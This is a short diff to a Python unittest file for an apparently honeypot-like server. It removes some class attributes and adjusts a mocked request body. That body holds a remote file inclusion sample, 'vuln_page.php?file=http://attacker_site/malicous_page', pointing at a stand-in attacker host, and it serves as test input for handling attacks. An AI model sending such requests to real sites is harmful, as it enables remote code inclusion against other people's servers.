@@ -6,10 +6,6 @@ from unittest import mock
 
 
 class TestServer(unittest.TestCase):
-    MockedRequestHandler = None
-    srv = None
-    m = None
-    m_eof = None
 
     def setUp(self):
         with mock.patch('builtins.open', mock.mock_open(), create=True):
@@ -57,7 +53,7 @@ class TestServer(unittest.TestCase):
 
                 @asyncio.coroutine
                 def foobar():
-                    return b'{"path":"vuln_page.php?file=http://attacker_site/malicous_page"}'
+                    return b'{"path":"/vuln_page.php?file=http://attacker_site/malicous_page"}'
 
                 payload = mock.Mock()
                 payload.read = foobar
